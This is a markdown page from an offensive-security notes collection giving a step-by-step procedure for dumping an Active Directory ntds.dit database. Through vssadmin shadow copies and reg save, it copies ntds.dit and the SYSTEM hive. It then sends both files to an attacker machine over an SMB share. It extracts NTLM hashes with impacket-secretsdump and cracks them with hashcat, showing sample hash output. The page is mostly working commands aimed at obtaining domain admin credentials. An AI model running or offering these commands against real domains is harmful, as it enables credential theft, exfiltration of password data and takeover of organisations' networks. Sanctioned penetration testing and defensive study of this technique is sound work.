# Active Directory Domain - NTDS.DIT

- The `ntds.dit` file is the Active Directory (AD) database that stores information about domain objects, including user accounts, passwords (in NTLM hash format), groups, and group memberships. Extracting and cracking the NTDS.DIT file allows you to obtain domain credentials, which can be used for lateral movement and privilege escalation.


## NTDS.DIT File Location

- The `ntds.dit` file is located at:

```text
%systemroot%\NTDS\ntds.dit
````

> Typically:

```text
C:\Windows\NTDS\ntds.dit
```


### Step 1: Create a Volume Shadow Copy

- Create a shadow copy to access the `ntds.dit` file, since it's locked by the system:

1. List existing shadow copies:

```bash
vssadmin List Shadows
```

2. Delete the oldest shadow copy (if needed):

```bash
vssadmin Delete Shadows /For=C: /oldest
```

3. Create a new shadow copy:

```bash
vssadmin create shadow /for=C:
```


### Step 2: Copy the NTDS.DIT and SYSTEM Files

- Use the shadow copy path to copy the files:

```bash
mkdir c:\ntds
```

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit c:\ntds\ntds.dit
```

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\System32\config\system c:\ntds\system
```

- Alternatively, save the SYSTEM registry hive directly:

```bash
reg save hklm\system c:\ntds\system
```


### Step 3: Transfer Files to Kali Linux


- Use `smbserver.py` to transfer the files:

1. Start the SMB server:

```bash
python smbserver.py public /home/Public/
```

2. Copy files to the SMB share:

```bash
copy ntds.dit \\192.168.1.7\Public\
```

```bash
copy system \\192.168.1.7\Public\
```

3. Access the files on Kali Linux:


```bash
cd /home/Public/
```


### Step 4: Extract Password Hashes from NTDS.DIT

- Use `impacket-secretsdump` to extract NTLM hashes:

```bash
impacket-secretsdump -system system -ntds ntds.dit local
```

> Example Output:

```text
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xa8601b8f4d765037e59794157e8651f4
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 3b8475131db5a95caecceb7ddf8bfe66
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0ac06478613c3bbb5dcf4b9aba9a1b4f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
u1:1003:aad3b435b51404eeaad3b435b51404ee:a618414bffe992e520dfb5f3e4db7ff6:::
u2:1004:aad3b435b51404eeaad3b435b51404ee:a8f1476d35d4387681247a73edb7374b:::
[*] Cleaning up...
```


### Step 5: Save Results to File

- Save the extracted hashes to a file:

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

```bash
impacket-secretsdump -system system -ntds ntds.dit -hashes lmhash:nthash -outputfile ntlm-extract local
```

- Alternatively, using the full Python path:

```bash
python /opt/impacket/examples/secretsdump.py -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```


### Step 6: Crack NTLM Hashes with Hashcat

- Use `hashcat` to crack the extracted NTLM hashes:

1. Crack using a wordlist:


```bash
hashcat -m 1000 -a 0 n1.txt /data/wordlist/password -o ntml.out.txt
```

2. Optimized cracking session:


```bash
hashcat -m 1000 -w 3 -a 0 -p : --session=all --username -o cracked.out --outfile-format=3 ntlm-extract.ntds /data/wordlist/password --potfile-path hashcat.pot
```

3. Resume the session (if interrupted):


```bash
hashcat --session=all --restore
```

> Example of cracked hash output:

```text
u1:1003:aad3b435b51404eeaad3b435b51404ee:a618414bffe992e520dfb5f3e4db7ff6:::
u2:1004:aad3b435b51404eeaad3b435b51404ee:a8f1476d35d4387681247a73edb7374b:::
```


## Troubleshooting

### Cannot Create Shadow Copy

- Ensure you have administrative privileges.  

- Check for existing shadow copies and delete the oldest ones if needed.  

- Ensure the volume is not write-protected or corrupted.

### impacket-secretsdump Fails

- Ensure the SAM and SYSTEM files are correctly copied.  

- Confirm `impacket-secretsdump` is installed properly using `pip`.  

- Ensure the extracted files are not corrupted.


### hashcat Fails

- Confirm that `hashcat` is installed properly using `apt`.  

- Ensure the correct hash format (`-m 1000`) is used for NTLM hashes.  

- Increase the workload profile (`-w 3`) for faster cracking.


## Best Practices

- Use `vssadmin` carefully to avoid accidental data loss.  

- Store extracted hashes securely to avoid unauthorized access.  

- Monitor for suspicious activity after extracting credentials.  

- Use strong and unique passwords to prevent hash-based attacks.


## Tools Overview

|Tool|Purpose|
|---|---|
|impacket-secretsdump|Extracts NTLM hashes from NTDS.DIT files.|
|vssadmin|Manages volume shadow copies.|
|hashcat|Cracks NTLM/LM hashes.|
|john|Cracks NTLM/LM hashes using wordlists or rules.|
|smbserver.py|Creates an SMB share to transfer files.|
|reg|Exports Windows registry hives.|


## Conclusion

- Dumping and cracking NTLM hashes from the NTDS.DIT file allows you to gain domain admin credentials and control over an Active Directory environment. This is a powerful technique for penetration testing and red team operations.

## Related
- [Password Mining](Password-Mining.md) — parent hub
- [SAM and SYSTEM files](SAM-and-SYSTEM-files.md) — sibling hive-dumping technique
- Offensive Active Directory — domain context for NTDS.dit
- Mimikatz Usage and Execution — extracting hashes from the database
- Password Cracking — crack dumped domain hashes
